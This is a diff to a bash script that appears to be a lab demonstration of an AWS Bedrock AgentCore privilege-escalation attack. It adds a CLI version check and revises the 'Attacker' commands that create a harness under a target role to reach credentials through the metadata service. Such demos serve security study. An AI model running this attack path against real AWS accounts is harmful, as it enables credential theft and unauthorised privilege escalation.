@@ -189,6 +189,19 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 echo -e "${GREEN}✓ boto3 is installed (botocore ${BOTOCORE_VERSION})${NC}"
+
+# The AgentCore Harness control plane APIs reached the AWS CLI in v2.34.35, and the
+# memory "disabled" option this scenario passes to create-harness reached it in v2.35.7.
+# The skeleton lists the members of the memory union, so it doubles as a capability
+# probe: it runs locally, calls no API and covers both the missing-operation case and
+# the older-model case, which otherwise fails with an opaque parameter validation error.
+AWSCLI_VERSION=$(aws --version 2>&1 | awk '{print $1}' | cut -d/ -f2)
+if ! aws bedrock-agentcore-control create-harness --generate-cli-skeleton 2>/dev/null | grep -q '"disabled"'; then
+    echo -e "${RED}Error: AWS CLI ${AWSCLI_VERSION} cannot disable harness memory (need >= 2.35.7)${NC}"
+    echo "Please upgrade: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html"
+    exit 1
+fi
+echo -e "${GREEN}✓ AWS CLI supports disabling harness memory (${AWSCLI_VERSION})${NC}"
 echo ""
 
 # [EXPLOIT] Step 3: Configure AWS credentials with starting user and verify identity
@@ -243,7 +256,7 @@ echo "available via MMDS at 169.254.169.254. InvokeAgentRuntimeCommand can then 
 echo "bash inside the MicroVM and read those credentials without ever invoking the model."
 echo ""
 
-show_attack_cmd "Attacker" "aws bedrock-agentcore-control create-harness --region $AWS_REGION --harness-name $HARNESS_NAME --execution-role-arn $TARGET_ROLE_ARN --model '{\"bedrockModelConfig\":{\"modelId\":\"$MODEL_ID\"}}'"
+show_attack_cmd "Attacker" "aws bedrock-agentcore-control create-harness --region $AWS_REGION --harness-name $HARNESS_NAME --execution-role-arn $TARGET_ROLE_ARN --model '{\"bedrockModelConfig\":{\"modelId\":\"$MODEL_ID\"}}' --memory '{\"disabled\":{}}'"
 
 # Set HARNESS_ARN sentinel before the API call so the trap fires even if the script is
 # killed between the call succeeding and our response-parsing code running.
@@ -304,7 +317,7 @@ use_starting_creds
 export AWS_REGION=$AWS_REGION
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "Attacker" "aws bedrock-agentcore-control get-harness --harness-id $HARNESS_ID --region $AWS_REGION --query 'status' --output text"
+    show_cmd "Attacker" "aws bedrock-agentcore-control get-harness --harness-id $HARNESS_ID --region $AWS_REGION --query 'harness.status' --output text"
     RUNTIME_STATUS=$(aws bedrock-agentcore-control get-harness \
         --harness-id "$HARNESS_ID" \
         --region "$AWS_REGION" \
